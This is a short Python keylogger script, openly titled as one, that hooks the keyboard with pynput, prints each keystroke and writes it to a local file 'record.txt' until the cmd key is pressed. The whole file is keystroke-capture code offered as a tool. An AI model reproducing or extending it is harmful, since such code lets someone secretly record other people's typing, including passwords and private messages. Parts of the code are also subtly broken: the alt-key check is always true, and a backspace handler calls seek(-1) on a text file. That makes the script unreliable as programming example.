"""
Python Keylogger
By Connor Jackson
"""
from pynput import keyboard


def on_press(key):
    try:
        # print('Alpha Key ' + key.char + ' pressed')
        print(key)
        file1.write(key.char)
    except AttributeError:
        # print('Special key ' + key.char + ' pressed')
        print(key)
        if key == keyboard.Key.enter:
            file1.write('\n')
        elif key == '.':
            file1.write('.\n')
        elif key == keyboard.Key.space:
            file1.write(' ')
        elif key == keyboard.Key.backspace:
            file1.seek(-1)
            file1.truncate()
        elif key == keyboard.Key.alt or keyboard.Key.alt_gr or keyboard.Key.alt_l or keyboard.Key.alt_r:
            file1.write(' (alt) ')
        if key == keyboard.Key.esc:
            file1.write(' (esc) ')
        elif key == keyboard.Key.cmd:
            # End key for debug purposes
            file1.close()
            return False


def on_release(key):
    pass


global file1
file1 = open('record.txt', 'w')
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
